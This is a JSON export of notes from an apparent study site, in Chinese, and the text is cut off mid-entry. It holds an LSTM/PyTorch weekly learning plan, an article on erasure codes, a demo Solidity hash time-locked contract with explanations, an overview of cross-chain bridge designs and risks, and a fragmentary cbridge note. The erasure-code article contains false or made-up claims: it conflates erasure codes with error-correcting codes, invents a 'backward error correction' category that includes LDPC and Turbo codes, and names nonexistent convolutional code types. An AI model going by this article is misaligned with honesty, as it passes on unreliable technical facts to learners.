{"Week5_LSTM/README":{"slug":"Week5_LSTM/README","filePath":"Week5_LSTM/README.md","title":"README","links":["01_基础理论系列/README","02_PyTorch框架系列/README","03_LSTM模型构建系列/README","04_时序数据处理系列/README","05_模型训练优化系列/README","06_实战应用系列/README"],"tags":[],"content":"Week 5 LSTM深度学习模型 - 知识点体系\n📚 文档说明\n\n文档版本: v1.0\n创建日期: 2025-01-09\n学习主题: LSTM深度学习模型\n适用对象: Qlib量化投资学习者\n建议学习时间: 5-6小时（4-5天）\n\n\n📖 文档体系\n本文档采用分系列组织方式，将Week 5的知识点分为6个系列，每个系列聚焦一个核心主题。\n系列列表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n系列说明文档路径1. 基础理论系列深度学习基础、RNN与LSTM原理README.md2. PyTorch框架系列Tensor、Autograd、nn.Module、常用层README.md3. LSTM模型构建系列单层、多层、双向LSTM架构README.md4. 时序数据处理系列滑动窗口、标准化、DatasetREADME.md5. 模型训练优化系列损失函数、优化器、训练循环README.md6. 实战应用系列完整流程、调优、评估README.md\n\n🎯 学习路径\n推荐学习顺序\nStep 1: 基础理论系列\n   ↓\nStep 2: PyTorch框架系列\n   ↓\nStep 3: LSTM模型构建系列\n   ↓\nStep 4: 时序数据处理系列\n   ↓\nStep 5: 模型训练优化系列\n   ↓\nStep 6: 实战应用系列\n\n每日学习计划\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n天数学习内容预计时间Day 1基础理论系列 + PyTorch框架系列1.5-2小时Day 2LSTM模型构建系列1小时Day 3时序数据处理系列1小时Day 4模型训练优化系列1-1.5小时Day 5实战应用系列1.5小时\n\n📊 知识点概览\n1. 基础理论系列\n核心知识点:\n\n✅ 深度学习基础（神经元、激活函数、神经网络）\n✅ 序列数据特点\n✅ RNN原理与局限性（梯度消失）\n✅ LSTM原理（细胞状态、门机制）\n✅ LSTM vs RNN vs GRU对比\n\n关键概念:\n\n梯度消失问题\n细胞状态\n遗忘门、输入门、输出门\n长期依赖\n\n2. PyTorch框架系列\n核心知识点:\n\n✅ Tensor创建与操作\n✅ Autograd自动微分\n✅ nn.Module模型定义\n✅ 常用层（LSTM、Linear、Dropout）\n\n关键概念:\n\nrequires_grad\nbackward()\n计算图\nGPU加速\n\n3. LSTM模型构建系列\n核心知识点:\n\n✅ 单层LSTM\n✅ 多层LSTM\n✅ 双向LSTM\n✅ LSTM变体（堆叠、编码器-解码器、注意力）\n✅ 超参数选择\n\n关键概念:\n\nhidden_size\nnum_layers\ndropout\nbatch_first\nbidirectional\n\n4. 时序数据处理系列\n核心知识点:\n\n✅ 滑动窗口方法\n✅ 时间序列划分\n✅ 特征标准化（Z-score、Min-Max、RobustScaler）\n✅ PyTorch Dataset\n✅ DataLoader\n\n关键概念:\n\n序列长度（seq_len）\n训练/验证/测试集\n数据泄漏\n批处理\n\n5. 模型训练优化系列\n核心知识点:\n\n✅ 损失函数（MSE、MAE、Smooth L1）\n✅ 优化器（SGD、Adam、RMSprop）\n✅ 训练循环\n✅ 早停策略\n✅ 正则化（L1/L2、Dropout、BatchNorm）\n✅ 学习率调度\n\n关键概念:\n\n前向传播\n反向传播\n梯度裁剪\n过拟合\n学习率衰减\n\n6. 实战应用系列\n核心知识点:\n\n✅ 完整预测流程\n✅ 超参数调优（网格搜索、随机搜索）\n✅ 模型保存与加载\n✅ 评估指标（MSE、MAE、IC、ICIR）\n✅ LSTM vs LightGBM对比\n✅ 最佳实践\n\n关键概念:\n\n端到端流程\n模型持久化\n泛化能力\n样本外验证\n鲁棒性\n\n\n💡 学习建议\n1. 理论学习\n\n先理解RNN的局限性\n再学习LSTM的创新点\n掌握门机制的作用\n理解细胞状态的意义\n\n2. 实践练习\n\n从简单的单层LSTM开始\n逐步增加复杂度\n使用真实数据训练\n对比不同架构的性能\n\n3. 代码实现\n\n跟着文档实现代码\n理解每一步的作用\n尝试修改参数\n观察效果变化\n\n4. 问题解决\n\n遇到问题时先查看文档\n利用PyTorch官方文档\n搜索Stack Overflow\n在社区提问\n\n\n🔧 技能检查清单\n基础理论\n\n 理解深度学习基本概念\n 掌握序列数据特点\n 理解RNN的工作原理\n 知道RNN的局限性\n 掌握LSTM的架构\n 理解门机制的作用\n 知道LSTM vs GRU的区别\n\nPyTorch框架\n\n 能够创建和操作Tensor\n 理解自动微分原理\n 能够定义自定义模型\n 掌握常用层的使用\n 能够使用GPU加速\n\n模型构建\n\n 能够定义单层LSTM\n 能够定义多层LSTM\n 理解双向LSTM\n 知道如何选择超参数\n 了解LSTM变体\n\n数据处理\n\n 能够实现滑动窗口\n 能够划分时序数据\n 掌握特征标准化\n 能够创建Dataset\n 能够使用DataLoader\n\n训练优化\n\n 能够选择合适的损失函数\n 能够选择合适的优化器\n 能够实现完整的训练循环\n 能够使用早停策略\n 理解正则化方法\n 能够调整学习率\n\n实战应用\n\n 能够完成完整的预测流程\n 能够进行超参数调优\n 能够保存和加载模型\n 能够计算评估指标\n 理解LSTM vs LightGBM\n 掌握最佳实践\n\n\n📚 扩展阅读\n推荐书籍\n\n《深度学习》（Ian Goodfellow等）\n《动手学深度学习》（Dive into Deep Learning）\n《Python深度学习》（François Chollet）\n\n在线课程\n\nCoursera: Deep Learning Specialization\nFast.ai: Practical Deep Learning for Coders\nUdacity: Deep Learning Nanodegree\n\n论文\n\nHochreiter &amp; Schmidhuber (1997). Long Short-Term Memory\nCho et al. (2014). Learning Phrase Representations using RNN Encoder-Decoder\n\n官方文档\n\nPyTorch: pytorch.org/docs/\nPyTorch Tutorials: pytorch.org/tutorials/\n\n\n🎓 学习成果\n完成本系列学习后，您将能够：\n理论层面\n\n✅ 深入理解LSTM的工作原理\n✅ 掌握时序数据的处理方法\n✅ 理解深度学习的核心概念\n\n实践层面\n\n✅ 使用PyTorch构建LSTM模型\n✅ 训练和优化LSTM模型\n✅ 评估和对比模型性能\n\n应用层面\n\n✅ 将LSTM应用于量化投资\n✅ 进行股票价格预测\n✅ 提取时序特征\n\n\n📞 支持与反馈\n如有问题或建议，请通过以下方式联系：\n\nGitHub Issues: github.com/anomalyco/opencode/issues\n学习交流群: [待添加]\n\n\n祝学习顺利！🎓"},"blockchainguide/Blockchain_Basics/纠删码":{"slug":"blockchainguide/Blockchain_Basics/纠删码","filePath":"blockchainguide/Blockchain_Basics/纠删码.md","title":"纠删码","links":[],"tags":[],"content":"纠删码（Error-correcting code）是一种通过在原始数据中添加冗余信息来检测和纠正错误的编码方法。纠删码可以应用于许多领域，如数字通信、存储系统和信息理论等。在这篇文章中，我们将介绍纠删码的基本概念、分类以及常见的应用场景。\n一、基本概念\n1. 编码与解码\n纠删码的核心思想是对原始数据进行编码，在发送和接收端进行解码，实现错误检测和纠正。编码是指将原始数据转换为含有冗余信息的编码数据的过程；解码是指根据接收到的编码数据，从中恢复出原始数据的过程。\n2. 错误控制编码\n错误控制编码（ECC）是指一类能够检测和纠正存在少量错误的编码技术。ECC包括两种主要类型：前向纠错（FEC）和反向纠错（BEC）。前向纠错技术可以检测并纠正自发生的少量错误；而反向纠错技术则专门用于修复不可避免的大规模错误。\n3. 冗余度与容错性\n冗余度是指通过添加冗余信息增加的编码数据与原始数据的比例；容错性是指纠删码可以检测和纠正的错误数量。纠删码通常通过增加冗余度来提高容错性。\n二、分类\n1. 块编码与卷积码\n根据不同的编码方式，纠删码可分为块编码（Block Code）和卷积码（Convolutional Code）两种类型。\n块编码将指定长度的数据分割成若干个等长的块，每个块进行独立的编码和解码。块编码通常有更高的编码效率，并且计算速度较快。常见的块编码方案包括海明码、RS码和BCH码等。\n卷积码则是一种流式编码技术，它对连续的原始数据序列进行编码和解码。相比于块编码，卷积码具有更好的抗噪声性能和更高的编解码复杂度。在数字通信领域中，卷积码通常被应用于低信噪比环境下的无线信道传输。常见的卷积码方案包括半无限制和全无限制卷积码等。\n2. 码距\n码距是指在纠删码中任意两个编码向量之间的汉明距离（Hamming Distance）的最小值。汉明距离是指两个等长字符串之间相应字符不同的位置个数。码距越大，纠删码的容错性就越高，但同时也意味着冗余信息增多。\n3. 线性码与非线性码\n根据编码方式的不同，纠删码还可以分为线性码（Linear Code）和非线性码（Nonlinear Code）两种类型。\n在线性码中，任意两个编码向量之和仍然是一个有效的编码向量。这使得线性码具有更好的解码效率和更好的容错性。\n非线性码则没有这样的性质，因此其计算和解码难度较大。\n4. 前向纠错码和反向纠错码\n前向纠错码主要应用于低错误概率环境下的数字通信系统，如无线电通信、卫星通信等。常见的前向纠错码包括海明码、Reed-Solomon码、BCH码等。\n反向纠错码主要应用于高错误概率环境下的数据存储和传输系统，如硬盘驱动器、内存芯片、光盘等。常见的反向纠错码包括LDPC码、Turbo码等。\n三、纠删码的应用\n1. 数字通信\n纠删码在数字通信领域中得到广泛应用，它可以提高无线信道的质量和传输速率。例如，在GSM、CDMA、Wi-Fi和LTE等无线通信标准中，都采用了纠删码技术。这些无线系统需要检测并纠正通过无线信道传输时受损的数据包，以实现清晰的语音和高速的数据传输。\n2. 存储系统\n纠删码在存储系统中也有着广泛的应用。存储设备如硬盘驱动器、内存芯片、光盘、U盘等都使用纠删码技术来检测和纠正存储数据中的错误。\n例如，在RAID（Redundant Array of Independent Disks）存储系统中，磁盘阵列通过在多个磁盘上存储冗余数据来提高可靠性和容错性。如果一个或多个磁盘出现错误或故障，纠删码可以帮助恢复原始数据。\n3. 信息理论\n纠删码是信息论中的重要概念。信息论是一种研究信息传输和处理的学科，旨在解决如何将信息在信道中传输的问题。纠删码通过增加冗余度来提高信息在传输过程中的可靠性，是信息理论中重要的一环。\n4. 区块链\n纠删码也被应用于区块链技术中。在区块链中，数据通过分布式存储方式进行存储和传输。由于可能存在攻击者对节点进行攻击或故障造成的数据损失，因此需要采取纠删码等方式来确保数据的完整性和可靠性。\n​\t纠删码在区块链技术中的应用场景主要包括以下几个方面：\n1. 数据完整性验证\n区块链技术通过分布式存储方式来存储和传输数据，但在这个过程中可能会遇到由于节点攻击或故障等原因导致数据损失或篡改的问题。纠删码可以应用于数据完整性验证，通过添加冗余信息来检测并纠正因数据损失或篡改而引起的错误。\n例如，区块链上存储的交易数据、智能合约代码等都可能涉及到敏感信息和重要数据，采用纠删码来确保数据的完整性是非常必要的。\n2. 数据恢复\n区块链技术中的数据存储和传输是去中心化的，多个节点共同维护着整个网络的数据。如果某些节点发生故障，就可能导致部分数据丢失。此时，纠删码可以帮助从其他节点的冗余备份中快速恢复数据。\n3. 提高可靠性和容错性\n区块链技术中的数据存储和传输往往会遇到高强度攻击和网络故障等问题。采用纠删码可以提高区块链系统的可靠性和容错性，从而增强了整个网络的稳定性。\n4. 加密通信\n纠删码还可以用于加密通信中。目前的一些区块链应用采用了分布式节点共识等机制来保证数据的安全，但在实际应用场景中，由于用户数量众多、设备类型不同等原因，可能会出现一些通信故障或丢失的情况。这时候，采用纠删码技术可以有效地增强加密通信的安全性，减少通信错误和数据丢失的概率。\n总之，纠删码在区块链技术中有着广泛的应用前景，特别是在保障数据完整性、提高系统可靠性和容错性等方面，具有重要的作用。\n四、总结\n纠删码是一种通过添加冗余信息来检测和纠正数据错误的编码技术。它可以提高数字通信、存储系统和信息理论等领域中数据的可靠性和容错性。纠删码包括块编码和卷积码、线性码和非线性码、前向纠错码和反向纠错码等。 纠删码已在无线通信标准、存储设备、信息理论和区块链技术等众多领域得到广泛应用。"},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链_HTLC":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链_HTLC","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链_HTLC.md","title":"跨链_HTLC","links":[],"tags":[],"content":"哈希时间锁定合约（HTLC，Hashed Timelock Contract）是一种特殊的智能合约，用于实现跨链原子交换、支付通道网络和多跳支付等场景。HTLC将支付与哈希锁和时间锁关联起来。哈希锁确保支付在预先设定的条件下进行，而时间锁确保支付在一定时间内完成。\n以下是一个基于以太坊的HTLC合约实现的示例。请注意，此代码仅用于演示目的，并未经过全面审计。在实际生产环境中部署合约时，请务必对代码进行彻底审查并进行严格测试。\npragma solidity ^0.8.0;\n \ncontract HashedTimelock {\n    struct LockContract {\n        address payable sender;\n        address payable recipient;\n        uint256 amount;\n        uint256 releaseTime;\n        bytes32 hashlock;\n        bool refunded;\n        bool withdrawn;\n    }\n \n    mapping(bytes32 =&gt; LockContract) public contracts;\n \n    event LogHTLCNew(\n        bytes32 indexed contractId,\n        address indexed sender,\n        address indexed recipient,\n        uint256 amount,\n        uint256 releaseTime,\n        bytes32 hashlock\n    );\n    event LogHTLCWithdraw(bytes32 indexed contractId);\n    event LogHTLCRefund(bytes32 indexed contractId);\n \n    function newContract(\n        address payable _recipient,\n        bytes32 _hashlock,\n        uint256 _timelock\n    ) external payable {\n        bytes32 contractId = keccak256(\n            abi.encodePacked(msg.sender, _recipient, msg.value, _hashlock, block.timestamp)\n        );\n \n        require(contracts[contractId].releaseTime == 0, &quot;Contract already exists&quot;);\n \n        contracts[contractId] = LockContract(\n            msg.sender,\n            _recipient,\n            msg.value,\n            block.timestamp + _timelock,\n            _hashlock,\n            false,\n            false\n        );\n \n        emit LogHTLCNew(contractId, msg.sender, _recipient, msg.value, block.timestamp + _timelock, _hashlock);\n    }\n \n    function withdraw(bytes32 _contractId, bytes32 _preimage) external {\n        LockContract storage c = contracts[_contractId];\n \n        require(c.recipient == msg.sender, &quot;Invalid recipient&quot;);\n        require(c.withdrawn == false, &quot;Already withdrawn&quot;);\n        require(sha256(abi.encodePacked(_preimage)) == c.hashlock, &quot;Invalid preimage&quot;);\n        require(block.timestamp &lt;= c.releaseTime, &quot;Timelock has expired&quot;);\n \n        c.withdrawn = true;\n        c.recipient.transfer(c.amount);\n \n        emit LogHTLCWithdraw(_contractId);\n    }\n \n    function refund(bytes32 _contractId) external {\n        LockContract storage c = contracts[_contractId];\n \n        require(c.sender == msg.sender, &quot;Invalid sender&quot;);\n        require(c.refunded == false, &quot;Already refunded&quot;);\n        require(c.withdrawn == false, &quot;Already withdrawn&quot;);\n        require(block.timestamp &gt; c.releaseTime, &quot;Timelock has not expired&quot;);\n \n        c.refunded = true;\n        c.sender.transfer(c.amount);\n \n        emit LogHTLCRefund(_contractId);\n    }\n}\n以下是代码注释，详细说明了合约的功能和结构：\n\n\nLockContract结构体：定义HTLC合约的数据结构，包括发送方、接收方、金额、释放时间、哈希锁、是否已退款和是否已提现等字段。\n\n\ncontracts映射：存储所有HTLC合约实例，以合约ID为键。\n\n\n事件定义：LogHTLCNew、LogHTLCWithdraw和LogHTLCRefund分别用于记录合约创建、提现和退款操作。\n\n\nnewContract函数：用于创建新的HTLC合约。此函数接受以下参数：\n\n_recipient：接收方地址。\n_hashlock：哈希锁，为预先定义的哈希值。\n_timelock：时间锁，用于设置合约释放时间。\n函数首先根据输入参数计算合约ID，然后检查该合约是否已存在。如果不存在，则创建并存储新的合约实例，并触发LogHTLCNew事件。\n\n\n\nwithdraw函数：用于从HTLC合约中提现资金。此函数接受以下参数：\n\n_contractId：要提现的合约ID。\n_preimage：用于解锁哈希锁的原像（解锁值）。\n函数首先检查调用者是否为合约接收方、合约是否已提现、提供的原像是否正确以及是否在时间锁范围内。如果满足这些条件，将资金转移到接收方地址，更新合约状态，并触发LogHTLCWithdraw事件。\n\n\n\nrefund函数：用于退款HTLC合约中的资金。此函数接受以下参数：\n\n_contractId：要退款的合约ID。\n函数首先检查调用者是否为合约发送方、合约是否已退款、合约是否已提现以及是否超过时间锁。如果满足这些条件，将资金转移到发送方地址，更新合约状态，并触发LogHTLCRefund事件。\n\n\n"},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链主流技术概览":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链主流技术概览","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链主流技术概览.md","title":"跨链主流技术概览","links":[],"tags":[],"content":"跨链桥\n兼容两条链不同协议、规则和治理的跨币、跨数据方案。其主要问题在于如何让另一条链知道并相信另一条链发生的事情,以及跨链桥托管用户资产。\n组成部分\n\n\n监控：relayer或者validator , 监控源连状态\n\n\n消息中继：将信息从源连传输到目标链\n\n\n共识：某些模型，需要在监控源连的参与者之间达成共识\n\n\n签名：参与者需要单独或者作为阈值签名方案的一部分对发送到目标链的信息进行加密签名\n\n\n跨链桥分类\n托管+共识\n代表：multichain、chainlink、harmony、pos bridge、polynetwork\n共识一般可以采用POS或者POA的方式， 通过一组validator 监控源连上的事件，通过达成共识对目标链执行操作\n缺点：依赖预言机喂价，所以网桥安全性会降级为预言机安全性，需要抵押，资本效率低\n轻客户端+中继\n代表 ：IBC 、Layer zero、 rainbow bridge\nRelayer监控源链事件，生成该链交易事件以及相关证明，将证明和区块头发到目标链的合约(轻客户端)，目标链的轻客户端会进行验证，这里有个所谓的Relayer的活跃性假设问题，安全角度方面，无需信任任何中介。\n优点：可传递任何类型数据，无需信任假设，资本效率最高\n缺点：存在活跃性假设，连接性问题（每个链对需要部署轻客户端合约）\n流动性网络\n代表：connext、hop、celer\n托管+中心化\n托管 + MPC（any swap）\n非托管+MPC （multichain）\nzk bridge\n流动池模式跨链桥\n为了理解流动池模式跨链桥是如何工作的，让我们来假想一个用户，他想要将 USDT 从以太坊转移到 Polygon。用户首先要将以太坊版本的 USDT 存入以太坊上的指定合约地址（流动池），并指定该 USDT 在 Polygon 上的接收地址，也就是 USDT 将在 Polygon 上记入的地址。跨链桥使用此信息将 Polygon 版本的 USDT 传输至指定的 Polygon 地址。\n这种设计的一个主要缺陷是，跨链桥必须保证其在目标链上持有的单边流动池中有足够的资产，以便用户实际完成资金转移。在上述示例中，如果跨链桥在 Polygon 上的 USDT 流动池为空，则存放在以太坊流动池中的 USDT 将被“卡住”，直到有其他用户请求从 Polygon 向以太坊反向转移 USDT，并有足够的 USDT 补充进 Polygon 的 USDT 流动池中。\n此外，该类型的跨链桥仅允许进行单一类型资产的跨链转移（例如，仅将 USDT 从以太坊转移至 Polygon）。如果想将以太坊上的 USDT 兑换成 Polygon 上的 MATIC，只能在 Polygon 上收到 USDT 后再进行兑换。\n这种设计的主要优点是，用户在目标链上收到代币后便不再需要依赖单边流动池的安全性。用户收到的资产是目标链上的原生资产，因此不需要依赖标的资产的赎回能力来确保其资产价值。这与“锁定&amp;铸造 / 销毁&amp;赎回”的另一种常用桥接设计形成鲜明对比。\n锁定&amp;铸造 / 销毁&amp;赎回\n如同之前，用户首先将以太坊版本的 USDT 存入跨链桥持有的指定合约地址，并在 Polygon 上指定接收地址。此步骤称为“锁定”。\n然而，与之前不同的是，该类型的跨链桥在 Polygon 上“铸造”或发行 Polygon 版本的存入资产，并将其记入接收账户。这些铸造的代币通常被称为“封装”代币，它们的价值取决于最终将它们赎回为源链上标的资产的能力。当用户想转移回以太坊时，封装代币被简单地发送到 Polygon 上的跨链桥合约地址并“销毁”。这使以太坊上的标资产被赎回并发送到指定的接收地址。\n由于封装代币依赖其可赎回性来维持其价值，因此封装资产的持有者面临智能合约风险。如果源链上的流动池被窃取并致使标的资产被掏空，则封装代币将变得毫无价值。\n尽管如此，锁定/销毁&amp;铸造机制的优势在于，此类跨链桥始终流畅地允许将资产从源链转移到目标链，反之亦然。这是因为它们不需要在跨链桥合约中部署目标链上的流动代币池。这促使该类型的跨链桥在可扩展性方面具有优势。\n原生跨链交换桥（带有去中心化的中间链\n在过去一年左右的时间里，该类型的跨链桥越来越受欢迎，THOR 链的壮大是其中一个促进因素。原生跨链交换桥允许用户将源链上的原生代币交换为目标链上的不同原生代币。例如，用户可以在无需封装资产的前提下，在各自的链上将原生 BTC 换成原生 ETH。这是通过利用跨链自动化做市商 (AMM) 和中间链来实现的，该中间链用来监控和记录源链和目标链的状态。尽管跨链交换不同原生资产的功能非常有用，但该类型的跨链桥使用了堪称最复杂的传输机制。\n为了简单地解释它的工作原理，让我们来看一个将原生 BTC 兑换成原生 ETH 的示例，我们将使用 THOR 链架构的基础版本作为参考。\n在该示例中，持有 BTC 的用户首先将 BTC（连同以太坊接收地址）发送到比特币金库地址。该金库由多个节点控制和监控，这些节点观测传入的交易并记录中间链（例如 THOR 链）上比特币金库的状态更新。\n一旦节点确认金库收到了 BTC，节点就会计算出适当数量的 ETH，记入给以太坊区块链上的用户。与其他任意 AMM 兑换类似，跨链兑换的执行价格取决于兑换额，这与两条链上金库中可用的 BTC 和 ETH 的相应数量有关。与使用少量流动性的小额兑换相比，“用尽”大量流动性的大额兑换将以更高的价格执行。一旦计算出兑换额，中间链就会向以太坊网络发送一条消息，使其将适当数量的 ETH 从金库地址发送到用户的接收地址。\n与流动池模式跨链桥相比，带有中间链的原生跨链交换桥具有更高水平的去中心化和抗审查能力。对于跨链桥用户来说，虽然流动性提供者仍可以通过黑客或漏洞从 AMM 的流动性池中窃取资产，但它能够规避封装资产带来的智能合约风险。\n尽管有这些优点，但此类跨链桥远比其他跨链桥的架构设计复杂得多。创建一个可信的去中心化原生跨链交换桥需要大量的资本投入和时间投入。例如，为了实现从 BTC 到 ETH 的原生兑换，THOR 链上每个节点都必须运行一个完整的比特币网络节点以及一个完整的以太坊网络节点。此外，必须激励 THOR 链上的每个节点保持诚实及可靠。为了实现单个兑换，必须完成上述所有。\n原生跨链交换桥（以稳定币交换为媒介）\n该类型的跨链桥旨在借鉴流动池模式跨链桥的简单架构，在此基础上提供交换原生资产的便利性。从本质上讲，此类跨链桥的工作方式很像流动池模式跨链桥，但增加了一个额外步骤，以此允许用户在目标链上接收的资产与他们在源链上存放的资产可以是不同类型的资产。LayerZero Labs 的 Stargate 跨链桥就是该类型的一个例子。我们将再次使用一个示例来解释它的工作原理。这次，让我们来考虑用原生 SOL 兑换原生 ETH。\n再次，用户首先将其资产 SOL 存入 Solana 上的指定合约地址，该地址由跨链桥持有。然而，与之前的例子不同，这笔存款实际上触发了 AMM 将 SOL 兑换为 Solana 上的稳定币。例如，它可能将 SOL 兑换成 USDC。从这步开始，跨链桥的功能将与流动池模式跨链桥极其相似。Solana 合约地址中的稳定币余额由跨链桥提供商划转至用户在以太坊的合约地址。\n最后，一旦 USDC 记入以太坊上的用户名下，跨链桥就会触发 AMM 执行从 USDC 兑换到 ETH。然后将此 ETH 记入用户指定的接收地址。从本质上讲，此类跨链桥的功能相当于流动池模式跨链桥，只不过仅跨链转移稳定币，以便在跨链转移过程中提供更优的执行价格。通常，两条链上的 AMM 兑换执行价格由一个计算兑换额规模的函数得出，该函数与两个单边池中的可用流动性相关。\n这种架构规避了封装资产的智能合约风险，并且提供了比中间链架构更简单的跨链通信机制。但是，由于执行价格取决于每个 AMM 的可用流动性，因此存在兑换执行价格不理想的风险。\n主（Home）合约/副本（Replica）合约传输消息（以Optimistic Fraud Proofs为媒介）\n这种特殊类型的跨链桥利用位于不同链上的两个合约地址（称为主合约和副本合约）以及四个接受激励的链下不同参与者，实现跨链发送消息。该类别中最著名的协议或许是 Nomad，它使得多链应用程序实现更轻松地跨区块链生态系统进行通信。让我们通过一个从以太坊向 Polygon 发送消息的简化示例来解释它的工作原理：\n\n由受激励的链下参与者更新、监控和传播的主合约和副本合约实现跨链发送消息\n以太坊上的用户首先会向以太坊上的主合约地址提交一条消息。主合约采集此消息并将其与接收到的其他消息一起放入队列中。此时，称为“更新者”的链下参与者签署该消息组以更新主合约的状态。为了签署这些消息，更新者必须向主合约质押保证金，如果之后证明更新者有任何恶意行为，该保证金将被没收。第二个链下参与者为“观察者”，监控主合约和 Polygon 上的副本合约，以确保所有消息都被正确记录和发送。\n由于跨链桥依赖于optimistic fraud proofs，所以为了防止恶意行为被执行和惩罚恶意更新者，由观察者负责提交恶意行为证明。若无恶意行为证明，跨链桥将假定消息已正确记录和发送（因此得名“optimistic乐观的”）。假设观察者没有检测到更新者有操作问题，第三个链下参与者“中继器”将把消息传输至 Polygon 上的副本合约。最后，第四个链下参与者“处理器”，将消息从副本合约传播到消息的最终接收者。\n这种架构更适合区块链之间的消息传递/数据传输，但因为资产转移最终也不过是以数据来体现账户余额的变化，所以理论上这种架构也可以用于转移资产。\n这种桥接设计的一个主要缺点是存在持续约 30 分钟的欺诈证明延时（DTD），为观察者扫描可疑行为并质疑恶意交易提供窗口期。Connext 和 Hop 这两个协议通过允许其他市场参与者在欺诈证明窗口期结束之前直接向最终接收者发送代币来缩短等待时间。实际上，这两个协议替接受者承担了恶意交易的相关风险，以此从希望获得更高流动性的接收者处收取费用。\n信任/无须信任\n在该分类中，跨链桥分为两类。它们要么是 1) 需要信任的，要么是 2) 无须信任的。换言之，用户要么信任某个第三方来操作跨链桥并确保安全，要么依赖分布式设计和运行的软件，这样任何单一实体都无法更改其状态或进行操作。需信任的跨链桥包括 xPollinate、Matic Bridge 和 Binance Bridge。无须信任的跨链桥包括 THOR链、Ren 和 Cosmos IBC。\n重要的是，需信任和无须信任之间的区别不是非黑即白，而是循序渐进的。与具有规模更大、更异构的运营商集合系统相比，运营商集合规模更小或地理上更集中的分布式软件协议将更容易受到单点故障的影响。同样，需要用户将资产锁定在合约地址中以换取封装资产的跨链桥也需要用户相信代码的编写方式能够防止攻击或窃取。非托管跨链桥则不需要这种信任，即便它们通常由中心化实体运行。\n连接对象\n从 Layer 1 到 Layer 1\n从 Layer 1 到 Layer 1 的跨链桥允许用户将资金在两个 L1 生态系统间进行转移。例如，Wormhole 的 Portal 跨链桥支持从 Solana 到以太坊的资产转移。通过促进 Layer 1 生态系统间的互操作性，使得 web3 用户可以在他们喜欢的链上自由地花费时间和资源，同时又保持灵活性来随时选择切换链。\n从 Layer 1 到 Layer 2\n从 Layer 1 到 Layer 2 的跨链桥接允许如以太坊的 L1 链与构建在 L1 链上的 L2 链进行通信。例如，用户可能希望将 ETH 从以太坊主网转移至 Arbitrum、Optimism 或 ZkSync。用户可以通过使用每个 L2 的原生跨链桥转移其代币，或者可以使用如 Across 的第三方跨链桥。随着 L2 生态系统的不断壮大，在将以太坊的主网活动转移至 L2 方面，此类跨链桥将发挥重要作用。\n从 Layer 2 到 Layer 2\n随着 2022 年上半年接近尾声，Layer 2 路线图变得越来越清晰。Polygon 的各种 Layer 2 扩展解决方案（Miden、Hermez、Nightfall）、Starkware 的零知识汇总 Starknet 和 Matter Lab 的 ZkSync 2.0，这些都将为开发人员构建不受高昂 gas 费困扰的应用程序提供必要的核心组块。然而，这些不同的 L2 本身并不兼容，因此它们有可能呈现我们在 L1 中看到的碎片化。L2 生态系统拥有高吞吐量、低 gas 费和强大安全性的好处，L2 到 L2 的跨链桥旨在减少 L2 间潜在碎片化的同时，发扬 L2 的上述好处。包括 Hop Protocol 和 Orbiter Finance 在内的一些项目正积极致力于实现这一目标。\n跨链桥设计的思考点\n\n安全性： 信任和活跃性假设、对恶意行为的容忍度、用户资金的安全性\n速度：完成交易的延迟，以及最终性保证\n资本效率：确保系统安全所需的资本和转移资产的交易成本\n连接性：为用户和开发者选择目标链，以及集成额外目标链的不同难度级别\n\n疑难杂症\n\n跨链桥如何解释具有概率最终一致性的块重组和时间强盗攻击\nNFT的出处，跨了N个桥的NFT在多个市场买卖算谁的\n遇到链阻塞或者攻击，跨链桥的应对\n\n前沿研究\n\n轻客户端验证header成本很高，有的是bridge到L2，比如在Zksync上实现tendermint客户端\n从受信任模型转变为绑定模型（资本效率低），但是安全\n阈值签名方案\n扩展流动性网络的流动性\n\n跨链桥的风险\n\n跨链桥层的共识漏洞/失败。这可能会导致持有抵押资金的跨链桥以及持有由跨链桥合成资产的用户遭受损失；\n由跨链桥的链没有共享状态。在桥接过程中，如果 A 链受到 51% 攻击并且交易被还原，则 B 链上的合成资产可能会遇到麻烦。在这种情况下，B 链资产不再被完全抵押。系统的安全性取决于其最薄弱的环节；\n合成资产是 DeFi 中安全性较低的抵押品，可能会带来系统性风险。大多数网桥将代币包装成合成资产，这些资产实际上是网桥上的资产借据：\n如果合成资产在 DeFi 中被广泛用作抵押品，无论出于何种原因脱钩，都可能会导致资产被清算；\n每种合成资产都在争夺流动性，最终将导致用户的碎片化和更差的执行价格；\n一些合成资产需要外部预言机进行定价，这是另一个风险来源。\n无需信任的网桥至少有一个中心化组件。虽然这些跨链桥旨在逐步完全去中心化，但其系统中至少有一个中心化组件，例如预言机、中继器。如果这些外部组件无法正常运行，可能会给系统带来风险；\n智能合约风险。从 Wormhole 协议被攻击可以看出，共识漏洞并不是唯一的攻击媒介。黑客可以利用智能合约来生成验证者认可的伪造签名，从而在不提供底层抵押品的情况下铸造合成代币。这只是一个智能合约漏洞利用，实际上可能有更多智能合约漏洞。\n"},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/abitrum":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/abitrum","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/abitrum.md","title":"abitrum","links":[],"tags":[],"content":""},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/cbridge":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/cbridge","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/cbridge.md","title":"cbridge","links":[],"tags":[],"content":"SGN\npos 链，对L1←&gt;L2 交易进行共识，生成多重签名，表明跨链交易可行。\nSGN作为cBridge节点网关和服务水平协议（SLA）仲裁器\n![image-20230506100319074](/Users/carver/Library/Application Support/typora-user-images/image-20230506100319074.png)\nSGN会监控cbride节点的状态和性能以及跨链陈功率等等指标，来将用户请求分发到合适的节点上， 对不能完成承诺的节点，进行惩罚\nSGN作为共享流动性池管理者\n![image-20230506103544494](/Users/carver/Library/Application 